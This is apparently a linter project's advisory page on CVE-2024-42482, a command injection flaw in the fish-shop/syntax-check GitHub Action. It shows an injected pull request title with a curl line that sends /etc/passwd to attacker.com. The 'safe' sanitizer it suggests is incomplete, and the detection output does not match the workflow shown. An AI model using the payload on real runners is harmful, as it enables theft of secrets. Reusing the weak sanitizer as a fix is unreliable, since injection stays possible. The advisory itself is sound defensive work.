# GHSA-xj87-mqvh-88w2

## Summary
| Field | Value |
|-------|-------|
| CVE | CVE-2024-42482 |
| Affected Action | fish-shop/syntax-check |
| Severity | Moderate |
| CVSS Score | 6.9/10 (CVSS:4.0) |
| Vulnerability Type | Improper Neutralization of Delimiters (CWE-140) |
| Published | 2024-01-23 |

## Vulnerability Description

The fish-shop/syntax-check action contains an **Improper Neutralization of Delimiters** vulnerability (CWE-140). The issue stems from inadequate sanitization of the `pattern` input parameter, specifically failing to neutralize command separators (`;`) and command substitution characters (`(` and `)`). This allows attackers to inject arbitrary commands by manipulating the input value used in workflows.

The vulnerability could lead to exposure or exfiltration of sensitive information from the workflow runner, including environment variables that might be transmitted to external entities. An attacker can inject additional patterns, commands, or manipulate the file matching logic by crafting malicious input that exploits the unsanitized pattern parameter.

**EPSS Score:** 0.849% (74th percentile) - estimated probability of exploitation within 30 days

**Affected versions:** All versions before 1.6.12 (v1.x.x series)
**Patched versions:** 1.6.12 (v1.x.x), 2.0.0 (v2.x.x)

## Vulnerable Pattern

```yaml
on:
  pull_request_target:

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: fish-shop/syntax-check@v1
        with:
          pattern: ${{ github.event.pull_request.title }}
```

**Attack Vector**: An attacker creates a PR with title:
```
*.fish; curl https://attacker.com?data=$(cat /etc/passwd)
```

Or using command substitution:
```
*.fish$(whoami)
```

This can inject shell commands that execute in the workflow context, potentially exfiltrating data or modifying workflow behavior.

## Safe Pattern

```yaml
on:
  pull_request_target:

jobs:
  safe:
    runs-on: ubuntu-latest
    steps:
      # Safe: Use fixed, hardcoded pattern
      - uses: fish-shop/syntax-check@v1
        with:
          pattern: "**/*.fish"

      # Alternative: Sanitize if dynamic pattern needed
      - name: Validate pattern
        env:
          PATTERN_INPUT: ${{ github.event.pull_request.title }}
        run: |
          SAFE_PATTERN=$(echo "$PATTERN_INPUT" | tr -d ';()')
          echo "SAFE_PATTERN=$SAFE_PATTERN" >> $GITHUB_ENV
```

**Mitigation**:
1. Use fixed, hardcoded patterns when possible
2. If dynamic patterns are required, sanitize input by removing dangerous characters (`;`, `()`, `$`, etc.)
3. Validate input against an allowlist of acceptable patterns

## sisakulint Detection Result

```
script/actions/advisory/GHSA-xj87-mqvh-88w2-vulnerable.yaml:9:3: dangerous trigger (critical): workflow uses privileged trigger(s) [pull_request_target] without any security mitigations. These triggers grant write access and secrets access to potentially untrusted code. Add at least one mitigation: restrict permissions (permissions: read-all or permissions: {}), use environment protection, add label conditions, or check github.actor. See https://sisaku-security.github.io/lint/docs/rules/dangeroustriggersrulecritical/ [dangerous-triggers-critical]
script/actions/advisory/GHSA-xj87-mqvh-88w2-vulnerable.yaml:17:16: checking out untrusted code from pull request in workflow with privileged trigger 'pull_request_target' (line 9). This allows potentially malicious code from external contributors to execute with access to repository secrets. Use 'pull_request' trigger instead, or avoid checking out PR code when using 'pull_request_target'. See https://sisaku-security.github.io/lint/docs/rules/untrustedcheckout/ for more details [untrusted-checkout]
```

### Analysis

| Detected | Rule | Category Match |
|----------|------|----------------|
| Yes | UntrustedCheckoutRule | Yes |
| Yes | DangerousTriggersCriticalRule | Yes |

**Detection Mechanism**: sisakulint detects multiple security issues related to this vulnerability pattern:
- `UntrustedCheckoutRule` catches the untrusted checkout at line 17 in the privileged `pull_request_target` context
- `DangerousTriggersCriticalRule` flags the use of `pull_request_target` without mitigations at line 9

While sisakulint doesn't directly detect the delimiter injection vulnerability in the action's `pattern` parameter (as this is an internal action implementation issue), it successfully identifies the dangerous workflow context that makes exploitation possible.

## References
- [GitHub Advisory](https://github.com/advisories/GHSA-xj87-mqvh-88w2)
- [fish-shop Security Advisory](https://github.com/fish-shop/syntax-check/security/advisories/GHSA-xj87-mqvh-88w2)
- [Patch Commit v1.x.x](https://github.com/fish-shop/syntax-check/commit/91e6817c48ad475542fe4e78139029b036a53b03)
- [Patch Commit v2.x.x](https://github.com/fish-shop/syntax-check/commit/c2cb11395e21119ff8d6e7ea050430ee7d6f49ca)
- [CVE-2024-42482](https://nvd.nist.gov/vuln/detail/CVE-2024-42482)
- [sisakulint: ArgumentInjectionRule](../argumentinjection.md)
